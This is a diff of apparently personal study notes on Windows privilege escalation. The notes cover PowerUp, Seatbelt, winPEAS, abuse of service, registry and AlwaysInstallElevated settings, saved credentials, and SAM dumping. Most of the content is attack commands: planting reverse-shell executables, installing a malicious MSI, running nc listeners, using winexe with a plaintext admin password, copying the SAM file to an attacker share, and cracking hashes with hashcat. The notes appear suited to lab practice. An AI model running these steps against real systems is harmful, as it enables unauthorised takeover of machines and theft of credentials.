@@ -1,4 +1,6 @@
-                                                                      POWERUP
+
+POWERUP
+
 Powerup is a tool that can help you find privilege escalation vulnerabilities
 
 enter powershell:
@@ -12,7 +14,8 @@ Invoke-AllChecks
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-                                                                     SEATBELT
+SEATBELT
+
 seatbelt is another script for trying to find privilege escalation vulnerabilities 
 
 if you just wanted seatbelt to list non-standard services:
@@ -22,7 +25,8 @@ run all enumeration checks seatbelt has to offer
 .\Seartbelt.exe all
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                                                          WINPEAS
+
+WINPEAS
 
 winPEAS is a very powerfull tool that not only aactively hunts for privilege escalation misconfigurations but highlights them for the user in the results
 
@@ -33,14 +37,16 @@ look at the different type of checks winpeas can do:
 ./winPEASany.exe -h
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                                                        ACCESSCHK.EXE
+
+ACCESSCHK.EXE
                                                                  
 accessChk is an old but still trustworhy tool for checking user access control rights
 
 you can use it to check weather a user or group has access to files, directories, services and registry keys.
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                                                          KERNEL EXPLOITS
+
+KERNEL EXPLOITS
 
 steps to take to identify potential kernel exploits:
 
@@ -56,7 +62,9 @@ steps to take to identify potential kernel exploits:
 4. follow the instructions in the exploit and run them.
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                                                          SERVICE EXPLOITS
+                                                                          
+SERVICE EXPLOITS
+
 query the configuration of a service:
 sc.exe qc <name>
 
@@ -69,7 +77,8 @@ sc.exe config <name> <option>= <value>
 Start/Stop a service:
 net start/strop <name>
 
-                                                                   insecure service permissions
+INSECURE SERVICE PERMISSIONS
+
 to enumerate insecure service permissions with winpeas use this command:
 winPeasany.exe quiet servicesinfo 
 
@@ -98,7 +107,8 @@ net start <service>
 
 DONE PRIVESC
 
-                                                                   Unquoted Service Path
+UNQUOTED SERVICE PATH
+
 run winpeas.exe to search for unquoted service path's:
 winPEASany.exe quiet servicesinfo 
 
@@ -129,7 +139,9 @@ net start <service>
 
 PRIVESC DONE
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                                                  Weak Registry permissions
+
+WEAK REGISTRY PERMISSIONS
+
 first run winpeas to see if there is weak registry permissions:
 winPEASany.exe quiet servicesinfo
 
@@ -160,7 +172,8 @@ net start <service>
 PRIVESC DONE
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                                                       Insecure Service Executable
+
+INSECURE SERVICE EXECUTABLES
                                                                        
 run this winpeas command to find insecure service executables:
 winPeasany.exe quiet servicesinfo 
@@ -195,10 +208,10 @@ net start service
 
 PRIVESC DONE
 
-                                                                            DLL HIJACKING
-                                                                            
+                                                                          
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                                                            Registry exploits
+
+REGISTRY EXPLOITS
                                                                             
 run winpeas with the aplications info check:
 winPeasany.exe quiet applicationsinfo
@@ -220,7 +233,7 @@ copy /Y reverse.exe "C:\Program Files\Autorun Program\program.exe"
 next set up a listner on the attacking machine:
 nc -nlvp 1337
 
-                                                                         AlwaysInstallElevated
+AlwaysInstallElevated
 
 run winpeas with the windowscreds check to discover the vulnerability:
 winPEASany.exe quiet windowscreds
@@ -246,7 +259,7 @@ run the reverse shell on the victim machine:
 msiexec /quiet /qn /i reverse.msi
 
 -------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                                                          PASSWORDS
+PASSWORDS
                                                                           
 seraching for passwords with winpeas:
 winPEASany.exe quiet filesinfo userinfo
@@ -257,7 +270,8 @@ winexe -U 'admin%password123' //192.168.1.22 cmd.exe
 this command will query the registry for passwords
 reg query HKLM /f password /t REG_SZ /s
 
-                                                                          Saved Creds
+Saved Creds
+
 use winpeas to search for stored passwords/credntials:
 winPEASany.exe quiet cmd windowscreds
 
@@ -270,7 +284,7 @@ nc -nlvp 1337
 we can use the saved admin cred we want to run any command as the admin user:
 runas /savecred /user:admin C:\PrivEsc\reverse.exe
 
-                                                                     configuration files
+configuration files
                                                                      
 Recursively search for files in the current directory with "pass" in the name, or ending in ".config"
 dir /s *pass* == *.config
@@ -281,7 +295,7 @@ findstr /si password *.xml *.ini *.txt
 search for passwords in configuration files with WinPeas:
 winPEASany.exe quiet cmd searchfast filesinfo
 
-                                                                            SAM
+SAM
                                                                             
 copy the SAM files back to kali:
 copy C:\Windows\Repair\SAM \\192.168.1.244\tools\
@@ -296,7 +310,8 @@ crack the admin hashes or user hashes using hashdump
 hashcat -m 1000 --force hash /usr/share/wordlists/rockyou.txt
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-                                                                   Scheduled Tasks
+                                                                   
+Scheduled Tasks
 
 list all scheduled tasks your user can see:
 schtasks /query /fo LIST /v
@@ -305,8 +320,6 @@ in powershell:
 Get-ScheduledTask | where {$_.TaskPAth -notlike "\Microsoft*"} | ft TaskName,TaskPath,State 
  
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------
-
-                                                                   Insecure GUI apps
 
 
 
